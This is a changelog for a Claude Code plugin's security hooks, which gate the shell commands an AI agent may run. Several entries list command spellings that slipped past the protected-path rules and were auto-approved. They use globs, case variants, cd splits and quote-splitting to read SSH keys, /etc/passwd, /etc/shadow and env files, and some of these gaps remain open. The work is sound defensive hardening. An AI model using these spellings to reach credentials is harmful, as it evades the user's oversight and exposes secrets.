# Changelog

All notable changes to the continuity-toolkit (`ctk`) plugin will be documented in this file.

## [2.17.8] - 2026-08-02 — shell-expanded path operands bypassed every literal rule (#116, glob half)

### Fixed

- **A glob operand reached protected resources with no prompt.** `security-blocker`
  matches protected resources by literal TEXT, so any spelling the SHELL expands at
  runtime never appears in the text it can see; `auto-approve-safe-bash` then
  certified the segment because `cat `/`ls`/`grep `/`find ` are on the safe-prefix
  allowlist, which inspects the COMMAND and never the operand. Measured net outcome
  through `bashCombined` on `a0ee038`: **21 spellings AUTO-APPROVED**, including
  `cat ~/.s*h/*`, which dumps an entire key directory in one command. Closed by a
  new per-segment gate, `hasExpandablePathGlob`, covering the wildcard, single-char,
  bracket-class and brace-expansion forms.

- **It withholds auto-approval; it does NOT deny.** A PreToolUse denial is terminal
  for a subagent, so a new denial surface on an everyday shell idiom is the more
  expensive error. The command drops into the standard permission flow instead.
  ⚠ **That is not the same as "always prompts", and the difference is not cosmetic:**
  withholding *our* approval restores the user's *configured* behaviour, so anyone
  who has separately allowlisted e.g. `Bash(cat:*)` in settings still sees no
  prompt. This closes the plugin's own over-approval, not the user's explicit
  configuration. An `ask` gate would override that configuration and was rejected
  for it.

### Measured, not estimated

The rule was chosen against **24,520 real Bash commands** extracted from 1,204 local
session transcripts, of which **2,801** are auto-approved by this hook today. Both
numbers are reported for every candidate so neither can be quoted alone:

| candidate | bypass rows covered | false prompts |
|---|---|---|
| rooted operand only | 14/21 | 13 (0.46%) |
| directory-component only | 12/21 | 8 (0.29%) |
| **either — shipped** | **21/21** | **21 (0.75%)** |
| any glob at all — *the issue's own proposal* | 21/21 | 254 (9.07%) |

Rooted-only misses `cd ~ && cat .s*h/id_rsa`; directory-component-only misses
`ls /e*c` and `grep -r x ~/.s*h`. The union closes both for 8 more prompts than the
cheapest option, and costs **12× less than the fix the issue proposed** for identical
coverage.

Two refinements came out of the same measurement rather than from judgement:

- **A quoted glob never expands** — `cat "~/.s*h/*"` names one literal file. Tracking
  quotes is worth 15 of the 36 false prompts the rule would otherwise carry.
- **A "pattern flag" allowlist (`-name`, `-iname`, `--include`) was REMOVED after
  being written.** It saved **zero** false prompts — quote tracking already covers
  the spelling people actually write — and it was unsound besides: an *unquoted*
  pattern value is expanded by the shell before `find` ever runs, so skipping it
  under-blocks. Both spellings are now pinned.

Backslash-escape handling is kept for correctness and saves **zero** false prompts on
the corpus. Recorded rather than dressed up as a benefit.

### Known gaps — #116 stays OPEN

- **Quote-splitting is untouched**: `cat "/e""tc/passwd"`, `cat /e''tc/passwd` and
  `cat ~/.s"s"h/id_rsa` carry no metacharacter at all, so no glob rule can reach
  them. Closing them needs quote-stripping normalization, the remaining half.
- `cd / && cat etc/passwd` writes no protected literal and no metacharacter. That gap
  is pre-existing, documented in `BASH_SYSTEM_DIR_PATTERNS`, and untouched here.

### Testing

- `tests/permission/auto-approve-glob.test.ts` — 44 new tests. Every row asserts the
  **exact** net outcome rather than `not.toBe('DENY')`, which a defer satisfies just
  as well as an auto-approve; the old pins in `security-blocker-case.test.ts` could
  see neither this fix landing nor it being reverted, and moved here.
- **Six mutation controls, all verified to fail**: dropping either branch, disabling
  quote tracking, disabling escape handling, restoring the pattern-flag skip, and a
  full revert of the gate. The first run of this battery found **two blind controls**
  of mine — rows for quoting and pattern flags that passed under the very mutations
  they existed to catch, because their operands were relative and basename-only, so
  they failed both branches regardless. Both were replaced with rooted spellings.

## [2.17.7] - 2026-08-02 — protected path rules were case-sensitive (#116, case half)

### Fixed

- **Every protected-path rule was case-sensitive, and the default macOS volume is
  not.** An upper- or mixed-case spelling of a protected directory reaches the same
  inode, so those spellings matched no rule and `auto-approve-safe-bash` then
  approved the command **with no prompt**. Measured end to end through
  `bashCombined`, the real wired entry point — never at the bare regex. The
  flagship case was reading the account file by its uppercase directory spelling,
  and dumping a key directory by the uppercase home spelling. Fixed by adding the
  `i` flag to every rule that matches a filesystem **path component**.

### Deliberately NOT fixed — and why (each is a MEASURED false positive)

Four rules keep case sensitivity. Making them case-insensitive was measured to deny
ordinary work, and a denial is terminal for a subagent:

| Rule | What `i` would newly deny |
|---|---|
| env-file rules | a container-inspect Go-template field, which is capitalised |
| private-key extension family | the .NET dictionary-property idiom |
| cluster-config filename | that tool's env var, whose uppercase spelling is universal |
| superuser home | a popular servlet container's default webapp uses the uppercase name |

The superuser-home exclusion also **buys nothing**: that directory does not exist on
macOS (the account's home lives under the per-user tree, already covered by the
case-folded rule), and Linux volumes are case-sensitive, so the uppercase spelling
is simply a different path there. Pure cost, zero benefit.

### Scope and known gaps

- **Scope is the CASE half of #116 only.** The glob and quote/brace-splitting halves
  are untouched, pinned as known gaps, and **#116 stays open**.
- The uppercase env-file spelling stays reachable — closing it requires `i` on the
  env-file rules, which denies the container-inspect idiom above. The more expensive
  error is the new denial surface, so the gap is documented rather than closed.
- **The remaining false-positive cost is not zero and is not claimed to be.** Two
  contrived uppercase directory spellings are newly denied. Both have lowercase
  twins that were **already denied before this change**, because the qualified rules
  carry no left boundary — `i` makes an existing over-broad class case-consistent
  rather than creating one. That pre-existing class is filed as **#118**, which also
  records the trap: fixing it by adding a left boundary to the qualified rules turns
  the `/private/`-prefixed spellings into real bypasses (measured), so #118 and #117
  are coupled and must not be fixed independently.

### Testing

- New `security-blocker-case.test.ts` (39 tests). **It pins the `i` flag, which
  `.source` cannot see** — the #114 tripwire looks patterns up by `.source`, and
  flags are not part of it, so that tripwire stays green on a complete revert of
  this fix. Verified by mutation: reverting the source file turns the new file red
  (16 failures) while the #114 file stays green at 48/48.
- The control asserts both directions — that the path rules **carry** `i` and that
  the four excluded rules **do not**. Without the second half, "add `i` everywhere"
  would satisfy every assertion in the file.
- The #99 per-user-temp exemption is asserted in **both** spellings: the flag
  case-folds its negative lookahead too, which is correct rather than widening.
- ctk 2707 tests (+39), shared 1415 — both green, no pre-existing test changed.

## [2.17.6] - 2026-08-02 — bare system-directory names were auto-approved (#114)

### Fixed

- **`security-blocker`: a system directory named without a trailing separator was
  unmatched, and `auto-approve-safe-bash` then approved the command with no prompt.**
  Every pattern in `BASH_SYSTEM_DIR_PATTERNS`, and the directory-qualified half of
  `BASH_SECRET_PATTERNS`, required a trailing `/`. Measured end to end through
  `bashCombined`: `ls <etc>`, `cd <etc> && cat passwd`, `cd <var> && cat log/system.log`
  were all **AUTO-APPROVED**. Closed with 12 additive patterns carrying **both** a left
  and a right boundary.

- **Six protections were defeated by a `cd` split, including SSH private keys.**
  `cd ~/.ssh && cat id_rsa` was auto-approved, as were `/etc/shadow`, `/etc/passwd`,
  `/etc/sudoers`, `/run/secrets/*` and `/root/*`. All now denied. (Two further
  prefix-dependent patterns, `/proc/*/environ` and `/etc/ssl/private/`, were *not*
  defeated — they survived incidentally because the `cd` target still carried a
  qualified system dir. Prefix-dependent and defeated are not the same set.)

### Fixed during review of this change — three defects in the first draft

- **The first draft had no LEFT boundary and denied ordinary project files.** It matched
  the last segment of any *relative* path: `cat config/boot.rb` (every Rails app),
  `cat app/root.tsx` (every Remix app), `du -sh ./var`, `ls -la ./etc` — all DENIED, and
  a denial is terminal for a subagent. That is strictly worse than the hole being closed.
  The 31-entry FP corpus could not detect it: every corpus entry uses an **absolute**
  path, so it has zero overlap with this false-positive surface and its `fp=0` was
  measuring the wrong thing. Fixed with `(?<![\w.-])`, and pinned by a new prefix-axis
  test block plus a mutation control that strips the lookbehind.
- **The flagship case reopened on one extra character.** `cd ~/.ssh/ && cat id_rsa` —
  with a trailing separator — was still auto-approved, because the bare rule declines on
  `/` and the two qualified ssh rules are narrower than the directory (`id_` prefix,
  `.pem` suffix), leaving `.ssh/config`, `.ssh/known_hosts` and `.ssh/authorized_keys`
  uncovered entirely. Closed with a blanket `.ssh/` rule.
- **`/private/tmp` and `/private/home` had the identical defect and were missed**, while
  this entry read as a complete closure. `ls /private/tmp` was auto-approved. Both now
  have bare siblings; the `claude-NNN` scratchpad exemption underneath is untouched.

### Known gaps — the bare *spelling* is closed, the *class* is not

Pinned as failing-by-design in `security-blocker-bare-dirs.test.ts`, the same convention
the #99 block uses:

- `cd / && cat etc/passwd` — no protected literal appears in the command at all.
- `cd ~root && cat k` — tilde-user expansion.

Both need a shell parse. **This list is not exhaustive** — a second adversarial review pass
found further spellings that reach the same resources and are net auto-approved. All were
measured **pre-existing** (identical verdicts at `c5a9101`, before this change), so they are
tracked separately rather than expanding this fix:

- **#116** — glob (`~/.s*h/*` dumps a key directory in one auto-approved command), case
  (`/ETC` resolves to the same inode on a case-insensitive volume), quote/brace splitting.
- **#117** — a protected name is matched only as the **leading** path component, leaving
  `/private/etc`, `/private/var` and `/Users/../etc` open.

⚠ #117 is **not** fixed by weakening the left lookbehind — that is exactly what produced the
Rails/Remix false-positive blocker documented above. Do not re-derive that fix.

Do not read this release as closing the class. It closes the bare spelling of the leading
path component, which is what #114 reported.

### Documentation — corrected in place (#75 policy)

- **The exposure-bound claim in `security-blocker.ts` was overstated and is now
  corrected.** It read that what bounds the exposure is that `BASH_SECRET_PATTERNS`
  "run first and independently". That holds for only **half** of them. The patterns
  split into *self-identifying* (`.env`, `kubeconfig`, `*.key` — match on filename
  alone, so a `cd` cannot separate a name from its own pattern) and *prefix-dependent*
  (`.ssh/id_`, `/etc/shadow`, `/root/`, `/run/secrets/` — need a directory component,
  and a `cd` defeats them). The KNOWN GAPS block asserted exactly the two cases where
  the claim held; it now pins the distinction instead.

### Notes on the #99 coupling

- **#114's own framing — that closing it "converts #99's five documented gaps into live
  bypasses" — is measured false.** Those gaps are unchanged by this fix: all **40**
  pre-existing tests in `security-blocker-macos-temp.test.ts` still pass (43 after the
  3 added here — counted by running the file at `c5a9101`, not by counting `it(` blocks,
  which loops make wrong), with the five gaps still pinned `false`.
  The bare patterns cannot fire on them, because the exempt path's only `/var` occurrence
  is followed by `/folders` and a bare rule never matches a name followed by `/`. What
  *did* change is their standing: gap #4 is now **load-bearing rather than redundant**,
  and is pinned as such.
- **The #99 exemption carries the mirror-image asymmetry, and it fails safe.** `(?!folders\/)`
  requires a trailing separator too, so the bare parent `/var/folders` falls *outside* the
  exemption and is denied by the #99 rule itself. #114 failed **open**; this fails **closed**.
  Left as-is deliberately and pinned, so a future "consistency" edit has to argue with a test.

### Tests

- New `security-blocker-bare-dirs.test.ts` (25 tests): the reported defect measured through
  the real wired entry point, both secret classes, the #99 exemption pinned as untouched,
  and non-regression cases (`/etcetera`, `/etc-backup`, `/user`, `/variables`, `/rootfs`)
  verified to genuinely discriminate — a loosened lookahead fails them.
- Must-fail controls derive from the **exported** arrays and assert through
  `matchesBashSensitivePattern(...).pattern`. PR #113 shipped a control that compared two
  locally re-declared literals and stayed green when the whole fix was reverted; this one
  throws at import if a pattern is missing.
- ctk 2645 pass · shared 1415 · dtk/atk/ftk/etk 963 each · corpus fp=0, fn=0.

## [2.17.5] - 2026-08-02 — macOS per-user temp paths are no longer denied (#99)

### Fixed

- **`security-blocker` denied any command naming a macOS TMPDIR path.**
  `BASH_SYSTEM_DIR_PATTERNS` carried a bare `/\/var\//`, and macOS puts every user's temp tree
  under `/var/folders/`. Since system directories are blocked on **any** reference, any installer,
  build tool, or test harness that wrote to `TMPDIR` and then ran the result was denied — ordinary
  work, refused on path text alone. Narrowed to `/\/var\/(?!folders\/)/`; `/var/log`, `/var/root`
  and `/var/db` stay protected.
- **Fixed the same false positive on the WRITE path.** `path-utils.ts` carried its own copy of the
  system-dir list, untouched by the first pass, so `Write`/`Edit` to a temp file stayed denied while
  `bash -c` writing the same file was allowed — the issue's own motivation ("writes there and then
  runs the result") only half solved. ⚠ **Both spellings need their own entry there**, unlike the
  Bash path: those patterns are **anchored** (`^`), so narrowing `/^\/var\//` does not cover
  `/private/var/…`. The Bash patterns are unanchored substring matches, where one lookahead suffices
  because `/private/var/folders/` *contains* `/var/folders/`. Same requirement, opposite mechanics.
  No traversal guard is needed on the write path — `isProtectedPath()` normalizes and resolves the
  path before matching, so `..` is already gone.
- **Added a PARTIAL traversal guard, and it is documented as partial.** The narrowing alone leaves a
  bypass: a path spelled from inside the exempt prefix contains exactly one match candidate, the
  lookahead suppresses it, and the resolved path lands back in the protected tree. The guard catches
  the **contiguous** form, which is what a build tool actually emits by accident.
  ⚠ **It does not close the bypass, and five defeating shapes are pinned as known gaps** — a space
  or tab in the path, a `..` ending in a quote, `cd <exempt> && cat ../…`, and traversal via a
  variable. Each was verified DENY before this change and ALLOW after. This cannot be fixed by
  widening the regex: deciding where a path resolves needs a shell parse — the same wall the
  abandoned mutation gate hit. What bounds the exposure is that the secret patterns and the
  dangerous-bash registry run first and independently.
- **Both spellings are covered by one pattern, verified rather than assumed.** `/var` is a symlink
  to `/private/var`, and the issue warned a carve-out honouring one spelling is bypassed via the
  other. It needs no second pattern: `/private/var/folders/` *contains* `/var/folders/`, so the
  same lookahead suppresses it. Pinned in both directions.

### Changed

- **Corrected three comments describing a mutation gate that does not exist.** The
  `BASH_SYSTEM_DIR_PATTERNS` docstring, `matchesSystemDirMutation`'s docstring, and the call site
  all said system dirs were "blocked only when the path is the TARGET of a mutating operation",
  and the function docstring specifically claimed `cat /etc/hosts > out.txt` was **allowed** while
  `echo x > /etc/hosts` was **blocked**. Measured on the live code: **both are denied**, and so is
  `ls /usr/bin` — a bare read with no verb. The described gate was built, demolished by adversarial
  review, and abandoned; only the comments survived. They are now marked, with an explicit warning
  **not to "restore" the gate to match them** — the two regex attempts leaked arbitrary writes to
  `/usr/local/bin` and `/etc/cron.d`.

### Testing

- **New `tests/pretool/security-blocker-macos-temp.test.ts`** (40 cases): both spellings allowed,
  genuine paths still denied, traversal escapes, sibling system dirs unaffected, the five **known
  gaps** pinned as documented trades, write-path coverage, and a scope test recording that this
  exemption is **not uid-bound** while the scratchpad one is.
- **Corrected a test that encoded this very bug as correct behaviour.**
  `security-blocker.test.ts`'s symlink case asserted `deny` for an ordinary file in a macOS temp
  directory, commented *"This is expected and correct security behavior"* — it was the #99 false
  positive, written down as an expectation, in a test whose own title says *"should allow"*. The
  platform branch is removed: after the carve-out nothing macOS-specific remains, and a branch only
  one OS can exercise hides regressions on the other.
- **Both rule-attribution tests were rewritten after review — the originals pinned nothing.** They
  declared local copies of the regexes and asserted about those, so reverting the entire source fix
  left them green; the one named `MUST-FAIL CONTROL` was fully tautological. They now derive from
  the exported `BASH_SYSTEM_DIR_PATTERNS` and assert through the `pattern` the live matcher
  reports, so replacing the guard with any other rule fails. Verified by two mutation controls:
  deleting the guard and reverting the narrowing each fail the suite, and the source restores
  byte-identical.
- **Parity rows are now pinned absolutely, not only against each other.** A pure parity assertion
  passes if both sides flip together, so the three "unprotected in both" labels were unchecked
  claims.
- **`security-blocker-fp-corpus` now separates two axes it had conflated.** `truth` answers "does
  the command touch its literal?"; it does not answer "should this be denied?", which also depends
  on whether the resource is protected. M1 touches a path that is now deliberately unprotected, so
  the old classifier turned a correct allow into a FALSE-NEGATIVE. A new `unprotected` flag carries
  that fact and **M1's `truth` stays `'touches'`** — the issue explicitly warned against relabelling
  it, and it is simply true. M1 is now a live regression guard: re-broadening `/var/` makes it a
  false positive and trips `expect(fp).toBe(0)`. Corpus stays at 31 entries, fp=0, fn=0.

## [2.17.4] - 2026-08-01 — correction: command bash blocks are a spec, not executed code

### Changed

Documentation only. **No behaviour changes** — the 2.17.3 fix is unaffected and every defect it
corrected was real. This release exists because 2.17.3 shipped a **wrong explanation** of *why*
those defects mattered, and an unbumped correction reaches no user.

- **Corrected the mechanism claim in three places** — this CHANGELOG's 2.17.3 entry, the
  "Why this exists (#109)" note in `commands/doctor.md`, and the header of
  `tests/doctor-command-shell-vars.test.ts`. Each said the dead loops *"iterated an empty list"* and
  *"exit 0 silently"*. **That describes literal execution of the fenced bash, which does not
  happen.**
- **What was measured.** A command body reaches the model as a `role=user` message — prompt text,
  not execution; CC never runs the fenced bash. Across **26 unwitnessed past sessions** invoking
  `/ctk:resume-session`, 27 of 29 invocations reached for Bash and **not one ran the block**: each
  composed its own command, they disagree with each other (`ls -t` vs `ls -1t`, absolute vs relative
  paths), and every one rendered as `-t` a sort order the source states only in *prose*. One session
  added a flag the source does not contain.
- **What this does not excuse.** The blocks are a **spec**, and an unbound variable makes the spec
  ambiguous — a reader must invent the value before acting. Literal text from a block demonstrably
  propagates into composed commands (3 of the 26 sessions embedded a block's literal line, one after
  editing it), so a wrong literal is **not inert**. The four defects 2.17.3 exposed — the wrong
  `hooks.json` path, the `"matcher"` count reading 0 for four plugins that register real hooks,
  `grep -c … || echo 0` yielding `0\n0`, and Step 7 reading the legacy log tree — are wrong *as
  instructions* too, and remain fixed.

Full evidence, including two controls that returned zero and were nearly misread as confirmation:
`docs/reviews/2026-08-01_command-md-execution-mode.md`.

## [2.17.3] - 2026-08-01 — /doctor's three per-plugin checks actually run (#109)

### Fixed

- **Steps 2, 3 and 7 of `/ctk:doctor` were an unusable spec.** Each looped over
  `$INSTALLED_PLUGINS`, unassigned since the initial commit. (The issue reported all three as living
  in Step 7; they are in Steps 2, 3 and 7.)

  > **⚠ CORRECTED in 2.17.4 (2026-08-01).** This entry originally read: *"never executed … all three
  > iterated an empty list. A loop over an empty list emits nothing and exits 0 — indistinguishable
  > from 'checked, nothing to report'."* **That described literal execution, which does not happen.**
  > A command body is delivered to the model as `role=user` prompt text; CC never runs the fenced
  > bash. The defect was real but its mechanism was **ambiguity, not silence** — see the 2.17.4 entry
  > above for the measurement and what it does and does not change.
- **Two further unassigned variables made the minimal repair unsafe.** `$PLUGIN_ROOT` (Steps 2, 3)
  and `$PLUGIN_SHORT_NAME` (Step 7) were also never assigned, and neither varied with the loop
  variable. Assigning `INSTALLED_PLUGINS` alone would have checked **one** path N times and
  labelled that single result with N plugin names — a confident wrong answer replacing a silent
  one. Replaced by a Step 2 inventory carrying name, marketplace, version and install path
  together, reused by Steps 3 and 7 via a temp file so they survive separate shells.
- **Step 3 read the wrong path** — `$PLUGIN_ROOT/hooks.json`; the manifest is at
  `hooks/hooks.json`. Wrong independently of the dead variable.
- **Step 3 counted `"matcher"` keys**, an *optional* field absent from non-tool events. Measured
  **0 registrations for dtk, atk, ftk and etk**, each of which registers real hooks. Now parses the
  manifest and counts handler entries (verified against `registerHook()`: dtk 2, atk 1, ftk 1,
  etk 1; ctk reports 50 handlers for 34 registrations because it wires hooks onto several events).
- **Step 3's `grep -c … || echo 0` yielded the two-line string `0\n0`** — `grep -c` prints `0` and
  exits 1 on no match, so the fallback appended a second `0`. Dormant while the loop never ran.
- **Step 7 read only the legacy log tree** (`~/.claude/logs/<short-name>/`), which #105/#106
  established holds test fixtures rather than live output. Now checks the live
  `<plugin>-<marketplace>` data dir first and labels a legacy reading as history. The short name is
  read from the installed plugin's own wrapper instead of a hardcoded map.
- **Skills-only and script-based plugins are no longer reported NOT BUILT.** The inventory spans
  every installed plugin, including third-party ones that ship `.mjs` hooks with no build step.

### Added

- **`tests/doctor-command-shell-vars.test.ts`** — fails if any variable expanded in `doctor.md` is
  never bound. Carries a must-fail control verified against the real pre-fix file extracted with
  `git cat-file blob` (reports exactly the three variables, exit 1), plus an inverse control so a
  variable named only in a comment is not counted as an expansion.

## [2.17.2] - 2026-08-01 — hook logs no longer leak into the real ~/.claude (#105)

### Fixed

- **`getLogDir()`'s fallback now honors `CLAUDE_CONFIG_DIR`** before `$HOME/.claude`. Keying it off
  `HOME` alone meant the per-plugin `CLAUDE_CONFIG_DIR` isolation in every `vitest.config.ts` could
  never cover logging — that isolation (added during #82) made snapshot-writing hermetic and left
  log-writing exactly as leaky as before. Test runs wrote **28 MB across 6 directories** into the
  developer's real home, and a shipped command (#106) read those fixtures back as real data.
- **`shared/hooks-infra/vitest.config.ts` gained `CLAUDE_CONFIG_DIR`** — it was the one config of
  six without it, which is why `~/.claude/logs/plugin/` accumulated 1026 fabricated rows.

`CLAUDE_PLUGIN_DATA` still takes precedence, so **live hook logging is unchanged**: CC sets that
variable for real dispatch, which is why the fallback runs almost exclusively under test and on
pre-`CLAUDE_PLUGIN_DATA` CC versions. Where it does run, respecting `CLAUDE_CONFIG_DIR` is the
correct behaviour — a user who relocates `.claude` expects their logs to move with it.

Pinned by 4 new cases in the symlinked `tests/lib/logging.test.ts`, including a guard asserting the
resolved directory is **not** under the real `HOME` when `CLAUDE_CONFIG_DIR` isolates it. Mutation
control: reverting the fallback to `HOME`-only fails the guard (the precedence case still passes,
which is why the guard is the one that pins it).


⚠ **Existing logs are not migrated.** For a user with `CLAUDE_CONFIG_DIR` set, prior logs stay at
`$HOME/.claude/logs/<plugin>/` while new writes go to `$CLAUDE_CONFIG_DIR/logs/<plugin>/` — chasing
history means reading both. The realistic path to hitting this is `bin/` scripts and manual `tsx`
invocations, which run with `CLAUDE_PLUGIN_DATA` unset. `/ctk:doctor` and `/etk:review-stats` were
updated in the same change to search the relocated tree (and to keep excluding the `logs/plugin/`
fixture directory, whose filter was `.claude`-anchored and would have missed a relocated one).
## [2.17.1] - 2026-08-01 — remove 6 `if` conditions that never gated (#98)

### Removed

- **All 6 group-level `if` conditions in `hooks.json`.** **4 of the 6 were measured directly** on CC
  **v2.1.220** and none confined its hook — `PreToolUse[0]` (2026-07-31, during #65),
  `PreToolUse[1]`, `PreToolUse[2]`, `PostToolUse[4]`. The remaining **2 are inferred**, not
  measured: `PostToolUse[1]` admits no constructible discriminator (its internal extension set is
  identical to its `if` list) and `PermissionRequest[0]` fires only on a permission dialog. Each
  hook's own internal guard is, and always was, the real filter. **No behavioural change on
  v2.1.220**, where the conditions were measured inert; this makes the actual behaviour explicit
  instead of accidental.

  Measured with controlled pairs carrying a must-fire and a must-not-fire control on each side:

  | Group | Hook | Probe that should have been excluded | Result |
  |---|---|---|---|
  | `PreToolUse[1]` | `preflight-context-injector` | `echo "rm -r"` — matches no glob under prefix *or* substring semantics | **fired** |
  | `PreToolUse[2]` | `write-combined` | `Write` to a `Dockerfile` | **fired** |
  | `PostToolUse[4]` | `review-logger` | `echo "glab mr note 42"` | **fired** |

- **Cause — best-supported explanation, from the official hooks documentation plus measurement.**
  They were wrong twice over. (The docs establish where `if` belongs; they do not describe what CC
  does when it appears at group level, so "never read there" is an inference from four
  measurements, not a documented fact.)
  1. **Wrong nesting level.** `if` is a **hook-handler** field — a sibling of `type`/`command`
     inside the `hooks` array — not a matcher-group field. All 6 sat one level up, where the key is
     never read.
  2. **Invalid value syntax.** *"The `if` field holds exactly one permission rule. There is no
     `&&`, `||`, or list syntax for combining rules."* Every value we shipped was a `||`-joined
     list, up to 20 alternatives. That combinator syntax exists in no CC subsystem.

- **Why this is a removal and not a repair — and why "fixing the nesting" must never happen.**
  `PreToolUse[0]` gates `security-blocker`, and all 20 of its globs are destructive verbs, so a
  *working* condition there would exclude every secret-file read (`cat <envfile>`,
  `curl -d @<envfile>`, `cat ~/.ssh/id_rsa`). Those are denied today **only** because the condition
  does not confine the hook. `PreToolUse[2]` is the same trap for the write path.

  ⚠ Now that the schema is known, the realistic route to that regression is **a maintainer
  correcting the nesting in good faith** — which is what the CC docs prescribe in general — not a
  future Claude Code change. Pinned by `tests/hooks-manifest.test.ts`, whose header names the
  tempting wrong fix. CC's own docs agree on the principle: *"the `if` filter is best-effort, use
  the permission system rather than a hook to enforce a hard allow or deny."*

### Fixed

- **Root `CLAUDE.md`'s v2.1.176 "floor note" retracted** — it asserted these conditions "gate
  correctly" at CC ≥ v2.1.176 and that this was the effective minimum version for our
  security/permission hooks. Both halves were wrong. Its source (the 2026-06-26 gap analysis, T1.1)
  verified the conditions were *present* and treated that as evidence they *work*; that entry is
  corrected in place.

Full measurements, the six-key landmine table, and the one sub-question that remains **NOT
ESTABLISHED** (what CC does with a malformed `if` at the *correct* nesting level — undocumented):
`docs/reviews/2026-08-01_98-hook-if-condition-cause.md`.

## [2.17.0] - 2026-08-01 — record plugin-tree state so #82 becomes diagnosable

### Added

- **`session-loader` writes a plugin-tree snapshot at every session start**, and `/doctor` gains
  **Step 1d** (`--state-diff`) to compare it against live state.

  Two investigations into #82 ended "trigger unidentified" for the same structural reason: every
  candidate artifact records only **current state**. `.last_inuse_sweep` is one overwritten
  timestamp, `installed_plugins.json` carries one `lastUpdated`, and a directory carries one
  `mtime` — which is last-write-wins, so a directory touched during one outage and touched again a
  week later shows only the later stamp. **The instruments record a state; the question is about a
  history.** Correlating seven measured outages against them proved nothing in either direction.

  Because measured outages begin **mid-session**, a session-start snapshot is a healthy "before".
  `dirsRemoved` is the field that matters: a plugin directory present at session start and gone
  when the outage is noticed is the strongest available evidence for the sweep hypothesis — and is
  exactly what #82's version-name comparison could not see, since a rewritten directory leaves the
  version *set* unchanged.

  Cost measured on a five-plugin install: **196 directories, 8 ms, 17.8 KB**, newest 20 retained.
  Every entry point is failure-tolerant; a diagnostic must never cost a session start.

### Fixed

- **The test suite was writing snapshots into the developer's real `~/.claude`** — 20 files stamped
  `test-session-loader-*` — and `--state-diff` then read them back as if they were evidence. Both
  halves are the repo's own recurring trap: a test suite arming a diagnostic, and a tool silently
  falling back to the legacy directory that only tests write to (the #101 defect, one directory
  over). `CLAUDE_CONFIG_DIR` is now isolated to a temp path in every plugin's `vitest.config.ts`,
  so **any** hook that touches `~/.claude` is hermetic under test, and `--state-diff` resolves via
  the same hardened discovery the log reader uses, warning loudly on a legacy fallback.

### Fixed after review (PR #103)

- **The snapshot invalidated itself, so exit `0` was unreachable.** `outDir` lives *inside*
  `pluginsRoot`, and capture ran before the write — so the write made the tree differ from the
  snapshot it had just taken. `/doctor` Step 1d documents exit `0` as "tree identical to session
  start", a verdict the tool could never emit. Excluding the snapshot directory is **not** enough
  on its own: *creating* it changes its parent's mtime and entry count, so the directory is now
  made **before** capture. The original `identical: true` control was a self-diff and never
  exercised the write.
- **Writer and reader derived the snapshot path independently and disagreed.** The writer used
  `<config>/logs/continuity/plugin-state` for the legacy case while the reader looked in
  `<config>/logs/plugin-state`, so that branch described a read that never happened; and the reader
  picked `candidates[0]` off an unsorted `readdir`, reintroducing the coin flip `resolveLogDir`'s
  own comment records as a bug. Both now call one `resolvePluginStateDir`, which prefers the data
  directory that **already holds snapshots** so a rebrand cannot orphan an existing history.
- Directory counting in the walk was `O(n²)` at the entry cap; the CLI header now states
  `--state-diff`'s exit contract and that `--json` applies to the outage scan only.
- **Snapshot writes are atomic** (temp file + `rename` within the same directory). A plain write
  leaves a truncated file if the process dies mid-write, and a truncated snapshot is worse than
  none — it is unparseable at exactly the moment it is needed. The reader also **falls back through
  older snapshots** rather than giving up on an unreadable newest one, reporting which files it
  skipped, and ignores `.tmp` leftovers.
- **Captured file content is now compared, instead of being dead weight.** `diffSnapshots` looked
  only at size and mtime, so a same-size edit — a version string swapped for another of equal
  length, exactly the shape a rebrand produces — compared as unchanged. Content is kept (it is the
  forensic record of which plugins and marketplaces were registered) and is now load-bearing.
- Each plugin's test suite gets **its own** temp `CLAUDE_CONFIG_DIR` rather than sharing one, so
  concurrent local runs cannot interfere.

### Known limits, stated rather than implied

- A session that starts **already** broken has no snapshot — nothing of ctk's runs to write one.
  Step 1b remains the live check for that case.
- A snapshot marked `TRUNCATED` cannot be compared safely: its missing entries are
  indistinguishable from removals. The flag is surfaced rather than silently tolerated.

## [2.16.0] - 2026-08-01 — retrospective detector for silent plugin unloads (#82)

### Added

- **`/doctor` Step 1c — look for PAST hook outages.** Step 1b asks *"is a hook firing in **this**
  session?"* and cannot see an outage that already ended, which is why #82 was believed to be a
  single event: nobody could look backwards. Step 1c joins hooked tool calls from CC's transcripts
  against ctk's own log lines, per hour, and reports hours where tools ran and hooks did not.

  Backed by `hooks/bin/detect-hook-outages.ts` (compiled to `dist/bin/`, runnable with plain
  `node`) over `lib/hook-outage-detector.ts`, which is unit-tested in all five plugins.

  **Applied to the machine it was built on, it found 7 outage hours between 2026-07-06 and
  2026-07-29 — not the single occurrence #82 records.**

### Why it is not a fixed threshold

`bash-combined` writes a permission line on auto-approve or deny, but **not** when a command
defers to a user prompt, and `hooks.log` is WARN-level so `logInfo` is suppressed. Measured
consequence: only **~0.5 log lines per hooked tool call**. Silence is therefore probabilistic —
a quiet hour of 5 tool calls occurs by chance about 5% of the time, so over a few hundred hours a
fixed `minTools=5` manufactures roughly a dozen phantom outages. It did: **18 reported, 7 real.**

The detector measures the logging rate from the data and applies a family-wise significance test,
reporting `pValue` and `pValue × hoursAnalysed` so any finding is auditable. Scanning more hours
raises the bar rather than lowering it. Both figures are printed, along with how many quiet hours
were rejected as chance.

### Four failure shapes pinned by tests

Each is a defect that actually shipped in an intermediate version and returned a confident wrong
answer, not a hypothetical:

1. **Per-session joins hide outages.** Sessions resume and SHARE a transcript file, so keying a
   file to its first `sessionId` averages a quiet outage away. Reported 0 suspects on data
   containing a real 9h16m outage.
2. **Not every tool is hooked.** An hour of `Grep`/`Task`/`WebFetch` legitimately logs nothing;
   counting all tools reported 4 phantom outages out of 6.
3. **The trailing hour is a snapshot artifact** — the log is mid-write when read, so without an
   exclusive upper bound "now" is an outage on every run.
4. **Silence is probabilistic** (above).
5. **An ONGOING outage excluded itself.** The upper bound was the last *logged* hour — but when
   hooks stop, the log stops, so that bound froze at the moment of failure and every hour of a
   live outage fell outside the window. Measured: 90 hooked calls across three silent hours
   reported `VERDICT: OK`, exit `0`. The bound now comes from the latest hour in **either**
   series, so only the genuinely in-progress hour is excluded.
6. **Analysing nothing reported `OK`.** `hoursAnalysed === 0` now exits `2` (inconclusive). This
   was the amplifier that turned a mis-resolved log directory into a confident all-clear rather
   than an honest "cannot tell".
7. **An arbitrary pick among plugin-data directories.** A machine predating the
   claude-dev-kit → claude-forge rebrand has more than one `ctk-*` data dir, and `candidates[0]`
   off an unsorted `readdir` could land on a stale one. All candidate directories are now read —
